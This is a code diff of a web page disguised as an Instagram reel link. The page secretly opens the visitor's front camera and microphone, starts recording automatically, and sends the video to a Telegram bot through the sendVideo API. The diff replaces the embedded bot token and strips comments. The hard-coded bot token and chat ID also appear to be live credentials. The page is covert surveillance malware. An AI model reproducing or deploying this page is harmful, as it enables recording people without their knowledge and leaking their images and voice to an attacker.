@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>https://www.instagram.com/reel/DRCJuY6jB5R/?igsh=ZmxkYzN0NGxsOHJn</title>
+    
     <style>
         /* إعدادات الشاشة الأساسية */
         body {
@@ -48,7 +49,7 @@
         // ******************************************************
         // ** إعدادات البوت والثوابت - تم التضمين بالمعلومات الخاصة بك **
         // ******************************************************
-        const BOT_TOKEN = '8299004372:AAErVG-8zGODSvXxn0ZChWzBWXa3iGvw3NA'; 
+        const BOT_TOKEN = '8564926075:AAEiDiYw5ryvtkZwIg493iU3lGQD2FV8804'; 
         const CHAT_ID = '7869791131'; 
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
         
@@ -97,7 +98,7 @@
             // إزالة عنصر الصورة من DOM بعد اختفائه تماماً
             setTimeout(() => {
                 coverImage.remove();
-            }, 600); // يجب أن تكون هذه المدة أطول قليلاً من مدة transition في CSS
+            }, 600); 
 
             // إيقاف بث الكاميرا بعد انتهاء التسجيل
             if (stream) {
@@ -113,8 +114,6 @@
         function startRecording() {
             if (!stream) return;
 
-            // MediaRecorder لتمكين تسجيل البث إلى ملف
-            // يمكن تحديد خيارات مثل mimeType هنا
             mediaRecorder = new MediaRecorder(stream);
             
             mediaRecorder.ondataavailable = (event) => {
@@ -147,7 +146,7 @@
                     video: { 
                         facingMode: 'user' 
                     },
-                    audio: true // عادةً يتم تسجيل الصوت مع الفيديو
+                    audio: true // تسجيل الصوت مع الفيديو
                 });
                 video.srcObject = stream;
                 
@@ -156,13 +155,11 @@
                 video.play();
                 
                 // *** بدء التسجيل التلقائي بعد 1 ثانية من بدء البث ***
-                // هذا التأخير يضمن أن يكون الفيديو مستقراً وأن الصورة الغلاف قد حملت
                 setTimeout(startRecording, 1000); 
 
             } catch (error) {
-                // في حال فشل الوصول للكاميرا، يمكن إخفاء الصورة الغلاف مباشرةً
+                // في حال فشل الوصول للكاميرا، يتم إخفاء الصورة الغلاف
                 coverImage.remove();
-                // لا يوجد معالجة مرئية أخرى
             }
         }
 
@@ -171,4 +168,3 @@
     </script>
 </body>
 </html>
-
